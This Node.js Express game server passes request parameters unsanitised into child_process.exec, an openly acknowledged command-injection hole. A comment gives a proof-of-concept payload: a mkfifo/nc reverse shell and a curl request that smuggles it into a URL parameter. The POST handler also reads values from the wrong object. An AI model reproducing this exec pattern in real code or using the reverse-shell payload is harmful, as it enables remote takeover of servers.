const path = require("path");
const { exec } = require("child_process");
const express = require("express");

const app = express();

app.use(express.json());

app.use(express.static(path.join(__dirname, "static")));

// fix RCE though flag injection later
// POC (payload):
// rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
// curl http://localhost:5000/cgi-bin/getGameData.d.byte?gameId=TCmBPQ&player=halt;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20127.0.0.1%204444%20%3E%2Ftmp%2Ff
const customExec = (cmd) =>
  new Promise((resolve, reject) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) reject(error);
      if (stderr) reject(error);
      resolve(stdout);
    });
  });

app.get("/cgi-bin/:bin", async (req, res, next) => {
  try {
    const { bin } = req.params;

    let paramArr = [];
    for (const key in req.query) paramArr.push([`--${key}`, req.query[key]]);

    paramArr = paramArr.map((el) => el.join(" ")).join(" ");

    const command = `${path.resolve(__dirname, "bin", bin)} ${paramArr}`;
    const result = await customExec(command);

    res.json(result.replace("\n", ""));
  } catch (e) {
    console.error("error: ", e);
    next(e);
  }
});

app.post("/cgi-bin/:bin", async (req, res, next) => {
  try {
    const { bin } = req.params;

    let paramArr = [];
    for (const key in req.body) paramArr.push([`--${key}`, req.query[key]]);

    paramArr = paramArr.map((el) => el.join(" ")).join(" ");

    const command = `${path.resolve(__dirname, "bin", bin)} ${paramArr}`;
    const result = await customExec(command);

    res.json(result.replace("\n", ""));
  } catch (e) {
    console.error("error: ", e);
    next(e);
  }
});

app.get("/", (req, res) =>
  res.sendFile(path.join(__dirname, "static", "index.html"))
);

app.get("/game", (req, res) =>
  res.sendFile(path.join(__dirname, "static", "game.html"))
);

app.use((err, req, res) => {
  res.status(err.status || 500).json({ error: err.message });
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => console.log(`Server started on port ${PORT}.`));
